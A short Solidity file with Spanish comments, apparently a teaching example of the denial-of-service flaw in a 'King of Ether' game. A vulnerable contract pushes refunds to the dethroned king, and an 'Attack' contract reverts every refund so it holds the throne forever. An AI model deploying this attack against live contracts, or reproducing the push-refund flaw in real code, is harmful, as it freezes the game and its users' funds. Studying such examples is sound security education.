// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        // Devolvemos ETH al Rey destronado
        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        // Seteamos al nuevo Rey
        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        // Instanciamos KingOfEther con su dirección
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // Función que revertirá la transacción siempre que se intente devolver el ETH al contrato.
    // Haciendo que nadie más pueda reclamar el trono.
    receive() external payable {
        revert();
    }

    // El ataque se origina cuando enviamos más ETH que el anterior Rey y el contrato Attack se convierte en el nuevo.
    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
